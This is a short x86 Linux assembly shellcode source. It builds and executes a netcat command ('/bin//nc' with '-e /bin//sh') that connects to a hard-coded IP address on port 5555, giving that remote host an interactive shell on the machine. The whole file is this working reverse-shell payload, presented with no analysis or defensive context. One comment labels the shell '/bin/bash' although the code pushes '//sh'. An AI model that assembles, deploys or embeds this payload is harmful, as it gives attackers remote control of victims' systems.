BITS 32

global _start

_start:
	xor edx, edx
	push edx
	push 0x636e2f2f
	push 0x6e69622f
	mov ebx, esp

	; IP	
	push edx	
	push 0x3231322e
        push 0x3235312e
        push 0x3038312e
        push WORD 0x3533
	mov eax, esp

	; PORT
	push edx	
	push 0x35353535 ; "5555"
	mov ecx, esp
	
	; -e
	push edx	
	push WORD 0x652d ; "-e"
	mov edi, esp
	
	; /bin/bash
	push edx
	push 0x68732f2f ; "//sh"
	push 0x6e69622f ; "/bin"
	mov esi, esp

	
	push edx ; 0
	push esi ; /bin/bash
	push edi ; -e
	push ecx ; PORT
	push eax ; IP
	push ebx ; /bin/nc 
	mov ecx, esp
	
	push 0xb
	pop eax
	int 0x80


